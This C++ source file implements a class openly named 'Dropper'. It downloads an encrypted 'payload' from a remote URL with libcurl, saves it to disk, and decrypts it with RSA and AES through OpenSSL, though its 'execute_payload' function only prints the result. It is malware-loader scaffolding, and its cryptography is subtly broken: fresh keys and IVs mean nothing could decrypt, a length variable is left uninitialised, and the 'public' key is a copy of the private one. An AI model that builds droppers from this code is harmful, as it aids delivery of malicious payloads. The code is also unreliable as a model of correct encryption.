#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <stdexcept>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <curl/curl.h>

class Dropper {
public:
    Dropper(const std::vector<unsigned char>& aes_key, EVP_PKEY* rsa_public_key, EVP_PKEY* rsa_private_key)
        : aes_key_(aes_key), rsa_public_key_(rsa_public_key), rsa_private_key_(rsa_private_key) {
        iv_.resize(EVP_MAX_IV_LENGTH);
        if (!RAND_bytes(iv_.data(), iv_.size())) {
            handleErrors();
        }
    }

    ~Dropper() {
        EVP_PKEY_free(rsa_public_key_);
        EVP_PKEY_free(rsa_private_key_);
        EVP_cleanup();
    }

    void download_payload(const std::string& url, const std::string& output_path) {
        CURL* curl;
        CURLcode res;
        std::string readBuffer;

        curl = curl_easy_init();
        if (!curl) {
            throw std::runtime_error("Failed to initialize CURL");
        }

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            curl_easy_cleanup(curl);
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_cleanup(curl);

        std::ofstream out(output_path, std::ios::binary);
        if (!out) {
            throw std::runtime_error("Failed to open file for writing");
        }
        out.write(readBuffer.data(), readBuffer.size());
    }

    void execute_payload(const std::string& payload_path) {
        std::ifstream file(payload_path, std::ios::binary);
        if (!file) {
            throw std::runtime_error("Failed to open payload file");
        }

        std::vector<unsigned char> encrypted_payload((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

        std::vector<unsigned char> decrypted_payload = decrypt_payload(encrypted_payload);

        std::string payload_str(decrypted_payload.begin(), decrypted_payload.end());
        std::cout << "Decrypted payload: " << payload_str << std::endl;
    }

private:
    std::vector<unsigned char> aes_key_;
    EVP_PKEY* rsa_public_key_;
    EVP_PKEY* rsa_private_key_;
    std::vector<unsigned char> iv_;

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
        size_t total_size = size * nmemb;
        std::string* response = static_cast<std::string*>(userp);
        response->append(static_cast<char*>(contents), total_size);
        return total_size;
    }

    void handleErrors() const {
        ERR_print_errors_fp(stderr);
        throw std::runtime_error("OpenSSL error occurred");
    }

    std::vector<unsigned char> decrypt_payload(const std::vector<unsigned char>& encrypted_data) {
        size_t rsa_key_size = EVP_PKEY_size(rsa_private_key_);
        std::vector<unsigned char> encrypted_aes_key(encrypted_data.begin(), encrypted_data.begin() + rsa_key_size);
        std::vector<unsigned char> encrypted_data_with_iv(encrypted_data.begin() + rsa_key_size, encrypted_data.end());

        std::vector<unsigned char> decrypted_aes_key(EVP_MAX_KEY_LENGTH);
        EVP_PKEY_CTX* pkey_ctx = EVP_PKEY_CTX_new(rsa_private_key_, nullptr);
        if (!pkey_ctx) {
            handleErrors();
        }
        if (EVP_PKEY_decrypt_init(pkey_ctx) <= 0) {
            EVP_PKEY_CTX_free(pkey_ctx);
            handleErrors();
        }
        size_t decrypted_aes_key_len;
        if (EVP_PKEY_decrypt(pkey_ctx, decrypted_aes_key.data(), &decrypted_aes_key_len, encrypted_aes_key.data(), encrypted_aes_key.size()) <= 0) {
            EVP_PKEY_CTX_free(pkey_ctx);
            handleErrors();
        }
        EVP_PKEY_CTX_free(pkey_ctx);

        EVP_CIPHER_CTX* cipher_ctx = EVP_CIPHER_CTX_new();
        if (!cipher_ctx) {
            handleErrors();
        }
        if (EVP_DecryptInit_ex(cipher_ctx, EVP_aes_256_cbc(), nullptr, decrypted_aes_key.data(), iv_.data()) != 1) {
            EVP_CIPHER_CTX_free(cipher_ctx);
            handleErrors();
        }

        std::vector<unsigned char> decrypted_data(encrypted_data_with_iv.size());
        int len;
        if (EVP_DecryptUpdate(cipher_ctx, decrypted_data.data(), &len, encrypted_data_with_iv.data(), encrypted_data_with_iv.size()) != 1) {
            EVP_CIPHER_CTX_free(cipher_ctx);
            handleErrors();
        }
        int final_len;
        if (EVP_DecryptFinal_ex(cipher_ctx, decrypted_data.data() + len, &final_len) != 1) {
            EVP_CIPHER_CTX_free(cipher_ctx);
            handleErrors();
        }
        decrypted_data.resize(len + final_len);
        EVP_CIPHER_CTX_free(cipher_ctx);

        return decrypted_data;
    }
};

int main() {
    try {
        ERR_load_crypto_strings();
        OpenSSL_add_all_algorithms();
        // OPENSSL_config is deprecated, so we won't use it

        std::vector<unsigned char> aes_key(EVP_MAX_KEY_LENGTH);
        if (!RAND_bytes(aes_key.data(), aes_key.size())) {
            throw std::runtime_error("Failed to generate AES key");
        }

        EVP_PKEY* rsa_private_key = EVP_PKEY_new();
        EVP_PKEY* rsa_public_key = EVP_PKEY_new();

        EVP_PKEY_CTX* pkey_ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, nullptr);
        if (!pkey_ctx) {
            throw std::runtime_error("Failed to create EVP_PKEY_CTX");
        }
        if (EVP_PKEY_keygen_init(pkey_ctx) <= 0) {
            EVP_PKEY_CTX_free(pkey_ctx);
            throw std::runtime_error("Failed to initialize keygen");
        }
        if (EVP_PKEY_keygen(pkey_ctx, &rsa_private_key) <= 0) {
            EVP_PKEY_CTX_free(pkey_ctx);
            throw std::runtime_error("Failed to generate RSA key");
        }
        rsa_public_key = EVP_PKEY_dup(rsa_private_key);
        EVP_PKEY_CTX_free(pkey_ctx);

        Dropper dropper(aes_key, rsa_public_key, rsa_private_key);

        std::string payload_url = "http://example.com/payload";
        std::string payload_path = "payload.bin";

        dropper.download_payload(payload_url, payload_path);
        dropper.execute_payload(payload_path);

        EVP_cleanup();
    } catch (const std::exception& e) {
        std::cerr << "An error occurred: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
